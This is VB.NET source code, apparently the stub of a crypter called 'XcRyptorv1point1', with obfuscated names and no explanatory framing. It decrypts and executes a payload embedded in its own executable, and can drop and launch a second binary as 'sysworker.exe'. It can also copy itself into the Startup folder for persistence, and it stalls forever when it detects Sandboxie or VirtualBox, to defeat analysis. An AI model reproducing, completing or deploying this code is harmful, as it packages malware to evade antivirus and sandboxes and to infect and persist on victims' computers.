
Imports System.IO
Imports System.Threading
Module BgoQeKbkkS
    Dim UFmlhsLUYJ As String
    Const QLvNwwTUME = "XcRyptorv1point1"
    Dim Devices As Object, Grafikadapter As String, RegionA As String = "SELECT * FROM Win32_VideoController"
    Dim asd As String

    Sub kkkk()
        Thread.Sleep(1000)

        jdcvOchqVw = Split(IO.File.ReadAllText(Process.GetCurrentProcess.MainModule.FileName), QLvNwwTUME)
        Thread.Sleep(1000)
        Dim uweBVRqOKp As Byte() = shifr.kfgMZvvDND(Convert.FromBase64String(jdcvOchqVw(1)), UFmlhsLUYJ)
        System.Text.Encoding.GetEncoding(1252).GetBytes(jdcvOchqVw(1))
        AIcQgTHKwDC.NVZa9wQD6P6(uweBVRqOKp, Application.ExecutablePath)

    End Sub
    Sub main()

        Dim aaaaa As Byte()
        jdcvOchqVw = Split(IO.File.ReadAllText(Process.GetCurrentProcess.MainModule.FileName), QLvNwwTUME)
        UFmlhsLUYJ = jdcvOchqVw(2)
        asd = jdcvOchqVw(3)
        If jdcvOchqVw(5) = "true" Then
            aaaaa = Convert.FromBase64String(jdcvOchqVw(6))
            IO.File.WriteAllBytes(My.Computer.FileSystem.SpecialDirectories.Programs + "\sysworker.exe", aaaaa)
            Process.Start(My.Computer.FileSystem.SpecialDirectories.Programs + "\sysworker.exe")
        End If
        If asd = "True" Then
            Dim info As New FileInfo(Application.StartupPath)
            info.CopyTo(My.Computer.FileSystem.SpecialDirectories.Programs + "\startup\SystemWorker.exe")
        End If
        Dim dsa As String

        dsa = jdcvOchqVw(4)

        If dsa = "True" Then

            Thread.Sleep(20000)


            Call sand()
            Call virt()
            If sand() = True Then Call loaop()
            If virt() = True Then Call loaop()

        End If

        Thread.Sleep(2500)
        Thread.Sleep(1000)
        Call kkkk()
    End Sub
    Sub loaop()
        Dim asdf = 0
        While 1 = 1
            asdf = asdf + asdf
        End While
    End Sub
    Public Function sand() As Boolean
        On Error GoTo error1
        If Process.GetProcessesByName("SbieSvc").Length >= 1 Then
            Return True
        Else
            Return False
        End If
        Exit Function
error1:
        End
    End Function
    Public Function virt() As Boolean
        On Error GoTo error1
        Call getDevices()

        Select Case Grafikadapter
            Case "VirtualBox Graphics Adapter"
                Return True
            Case Else
                Return False
        End Select
        Exit Function
error1:
        End
    End Function
    Private Sub getDevices()
        On Error GoTo error1
        Devices = GetObject("winmgmts:").ExecQuery(RegionA)
        For Each AdaptList In Devices
            Grafikadapter = AdaptList.Description
        Next
        Exit Sub
error1:
        End
    End Sub
    Dim jdcvOchqVw() As String



End Module
